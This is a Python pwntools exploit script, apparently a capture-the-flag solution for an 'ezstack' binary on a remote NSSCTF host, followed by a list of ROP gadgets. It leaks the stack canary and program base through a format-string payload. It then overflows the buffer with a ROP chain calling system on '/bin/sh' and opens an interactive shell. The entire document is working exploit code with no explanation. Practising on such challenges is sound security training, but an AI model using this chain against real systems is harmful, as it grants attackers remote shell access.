from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./ezstack")
io=remote("node4.anna.nssctf.cn",28583)
elf=ELF("./ezstack")

payload=b"%11$p.%17$p"
io.send(payload)
canary=int(io.recv(18),16)
print("canary: " + hex(canary))

io.recvuntil(".")
pro_base=int(io.recv(14),16)-elf.sym[b"main"]
print("pro_base: " + hex(pro_base))
io.recvuntil(b"--\n")

pop_rdi=pro_base+0xb03
sys_addr=pro_base+elf.sym[b"system"]
sh_addr=pro_base+0xb24
ret=pro_base+0x7c1

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)
io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000000afc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000000afe : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000000b00 : pop r14 ; pop r15 ; ret
# 0x0000000000000b02 : pop r15 ; ret
# 0x0000000000000afb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000000aff : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000000008c0 : pop rbp ; ret
# 0x0000000000000b03 : pop rdi ; ret
# 0x0000000000000b01 : pop rsi ; pop r15 ; ret
# 0x0000000000000afd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000000007c1 : ret

# Unique gadgets found: 11
